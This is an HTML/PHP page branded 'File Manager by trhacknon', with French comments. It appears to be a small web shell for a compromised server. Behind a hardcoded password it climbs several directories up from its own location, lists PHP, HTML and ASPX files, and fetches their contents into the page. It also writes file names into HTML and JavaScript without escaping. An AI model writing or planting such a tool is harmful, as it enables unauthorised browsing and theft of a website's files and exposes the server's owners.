<!DOCTYPE html>
<html>
<head>
    <title>File Manager by trhacknon</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
    <style>
        body {
            background-color: #333; /* Choisissez la couleur d'arrière-plan de votre choix */
            color: white;
            font-family: 'Courier New', monospace;
        }

        h1 {
            color: red; /* Couleur du titre */
            text-align: center;
        }

        ul {
            list-style-type: none;
            margin: 0;
            padding: 0;
        }

        li {
            margin: 5px 0;
            border: 1px solid red;
            border-radius: 5px;
            transition: background-color 0.3s, transform 0.3s;
            background-color: #00FF00; /* Couleur vive au survol */
        }

        li:hover {
            background-color: #00FF00;
            transform: scale(1.05);
        }

        a {
            text-decoration: none;
            color: green; /* Couleur du lien */
        }

        .directory {
            padding-left: 20px;
            background-color: #333;
            cursor: pointer;
        }

        .hidden {
            display: none;
        }

        #fileContent {
            background-color: #222; /* Couleur du cadre de contenu */
            border: 1px solid #00FF00; /* Bordure du cadre de contenu */
            padding: 10px;
            display: none; /* Masqué par défaut */
        }

        #fileContentText {
            white-space: pre-wrap; /* Préserve les sauts de ligne */
        }
    </style>
    <script>
        function toggleDirectory(directory) {
            const ul = directory.nextElementSibling;
            ul.classList.toggle("hidden");
        }

        function loadFileContent(url) {
            const fileContentElement = document.getElementById("fileContentText");
            fileContentElement.innerHTML = "Loading...";

            // Faites une requête AJAX pour charger le contenu du fichier
            const xhr = new XMLHttpRequest();
            xhr.open("GET", url, true);

            xhr.onload = function () {
                if (xhr.status === 200) {
                    fileContentElement.textContent = xhr.responseText;
                    document.getElementById("fileContent").style.display = "block"; // Afficher le cadre de contenu
                } else {
                    fileContentElement.textContent = "Error loading file.";
                }
            };

            xhr.send();
        }
    </script>
</head>
<body>
    <h1 class="animate__animated animate__bounce">File Manager by trhacknon</h1>
    <ul>
    <?php
    function isPasswordCorrect() {
        return isset($_POST['password']) && $_POST['password'] === 'trkntrkntrkn';
    }

    function listFilesAndDirectoriesByExtension($path, $extensions = []) {
        $items = scandir($path);
        if ($items === false) {
            return;
        }

        foreach ($items as $item) {
            if ($item != "." && $item != "..") {
                $itemPath = $path . '/' . $item;

                if (is_dir($itemPath)) {
                    echo '<li class="directory animate__animated animate__fadeIn" onclick="toggleDirectory(this)"><b>Directory:</b> ' . $item . '</li>';
                    echo '<ul class="hidden">';
                    if (isPasswordCorrect()) {
                        listFilesAndDirectoriesByExtension($itemPath, $extensions);
                    }
                    echo '</ul>';
                } else {
                    $fileExtension = pathinfo($itemPath, PATHINFO_EXTENSION);
                    if (in_array($fileExtension, $extensions)) {
                        echo '<li class="animate__animated animate__fadeIn"><a href="#" onclick="loadFileContent(\'' . $itemPath . '\')">' . $item . '</a></li>';
                    }
                }
            }
        }
    }

    $webPath = "../../../../"; // Chemin web de votre choix
    $allowedExtensions = ["php", "html", "aspx"]; // Extensions autorisées

    listFilesAndDirectoriesByExtension($webPath, $allowedExtensions);
    ?>
    </ul>

    <div id="fileContent">
        <pre id="fileContentText"></pre>
    </div>

    <?php if (!isPasswordCorrect()): ?>
    <form method="POST">
        Password: <input type="password" name="password">
        <input type="submit" value="Submit">
    </form>
    <?php endif; ?>
</body>
</html>